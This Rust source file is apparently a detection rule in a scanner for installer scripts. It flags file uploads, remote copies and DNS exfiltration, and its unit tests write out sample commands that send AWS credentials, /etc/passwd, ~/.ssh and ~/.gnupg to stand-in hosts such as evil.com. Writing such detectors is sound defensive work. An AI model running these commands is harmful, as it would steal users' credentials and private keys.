//! Red: uploads a file, or copies data out over a non-HTTP channel, in a way installers don't need.

use crate::analysis::Flag;
use crate::config::{NoConfig, Shared};
use crate::model::{Detail, Verdict};
use crate::parser::Command;
use crate::register_flag;

pub struct UploadExfil {
    shared: Shared,
    reported: bool,
}

/// `curl -T file`, `-F k=@file`, `-d @file`, `--data-binary @file`, `wget --post-file`.
fn uploads_file(c: &Command) -> Option<String> {
    let base = crate::config::base_name(&c.name);
    if base == "curl" {
        let args: Vec<&str> = c.arg_texts().collect();
        for (i, a) in args.iter().enumerate() {
            if matches!(*a, "-T" | "--upload-file") {
                return args.get(i + 1).map(|f| format!("uploads `{f}`"));
            }
            if matches!(*a, "-F" | "--form" | "-d" | "--data" | "--data-binary")
                && let Some(v) = args.get(i + 1)
                && v.contains('@')
                && !v.contains("@-")
            {
                return Some(format!("uploads file contents (`{v}`)"));
            }
        }
    }
    if base == "wget"
        && let Some(a) = c.arg_texts().find(|a| a.starts_with("--post-file"))
    {
        return Some(format!("uploads file contents (`{a}`)"));
    }
    None
}

/// `scp file host:`, `rsync … host:path`, `sftp`, `lftp`: an outbound copy to a remote host.
fn outbound_copy(c: &Command) -> Option<String> {
    let base = crate::config::base_name(&c.name);
    if !matches!(base, "scp" | "rsync" | "sftp" | "lftp" | "ncftpput") {
        return None;
    }
    // A `user@host:path` or `host:path` operand that is not a local path or option.
    c.arg_texts()
        .find(|a| {
            !a.starts_with('-')
                && a.contains(':')
                && !a.starts_with('/')
                && !a.starts_with('.')
                && !a.contains("://")
        })
        .map(|dest| format!("copies files to a remote host (`{dest}`) via {base}"))
}

/// `dig $(cmd).evil.com`, `nslookup "$data.x"`: data smuggled in a DNS query name.
fn dns_exfil(c: &Command) -> Option<String> {
    let base = crate::config::base_name(&c.name);
    if !matches!(base, "dig" | "nslookup" | "host" | "drill") {
        return None;
    }
    c.args
        .iter()
        .find(|w| {
            !w.text.starts_with('-')
                && (w.text.contains("$(")
                    || w.text.contains('`')
                    || (!w.literal && w.text.contains('.')))
                && w.text.contains('.')
        })
        .map(|w| format!("encodes data into a DNS query name (`{}`)", w.text))
}

impl Flag for UploadExfil {
    fn visit_command(&mut self, c: &Command) -> Verdict {
        if self.reported {
            return Verdict::Ignore;
        }
        let is_net = self.shared.is_network(&c.name);
        let what = (is_net && uploads_file(c).is_some())
            .then(|| uploads_file(c))
            .flatten()
            .or_else(|| outbound_copy(c))
            .or_else(|| dns_exfil(c));
        let Some(what) = what else {
            return Verdict::Ignore;
        };
        self.reported = true;
        Verdict::Red(
            Detail::new(
                format!("possible data exfiltration: {what}"),
                "The script sends local file contents or data off this machine. An installer downloads, it does not upload.",
            )
            .fix("Check exactly what path or value is being sent and to where.")
            .at(c.span.clone()),
        )
    }
}

register_flag! {
    id: "upload_exfil",
    kind: Red,
    category: Sensitive,
    description: "Uploads files (curl -T/-F @file/--data @file), copies out via scp/rsync, or DNS-exfil via dig",
    config: NoConfig,
    build: |_cfg, shared| UploadExfil { shared: shared.clone(), reported: false },
}

#[cfg(test)]
mod tests {
    #[allow(unused_imports)]
    use super::super::testing::*;

    #[test]
    fn flags_uploads_and_outbound_copies() {
        assert!(fires(
            "upload_exfil",
            "curl -T ~/.aws/credentials https://x.io/u"
        ));
        assert!(fires(
            "upload_exfil",
            "curl -F file=@/etc/passwd https://x.io/u"
        ));
        assert!(fires(
            "upload_exfil",
            "curl --data-binary @dump.txt https://x.io/u"
        ));
        assert!(fires("upload_exfil", "scp -r ~/.ssh evil@1.2.3.4:/loot"));
        assert!(fires("upload_exfil", "rsync -az ~/.gnupg backup:/x"));
        assert!(fires("upload_exfil", "dig \"$(whoami).exfil.evil.com\""));
    }

    #[test]
    fn ignores_normal_installer_traffic() {
        assert!(!fires(
            "upload_exfil",
            "curl -fsSL https://x.io/i.sh -o i.sh"
        ));
        assert!(!fires(
            "upload_exfil",
            "curl -d 'ping=1' https://x.io/telemetry"
        ));
        assert!(
            !fires("upload_exfil", "rsync -a ./dist /usr/local/share/tool"),
            "local rsync is fine"
        );
        assert!(!fires("upload_exfil", "dig +short example.com"));
    }
}
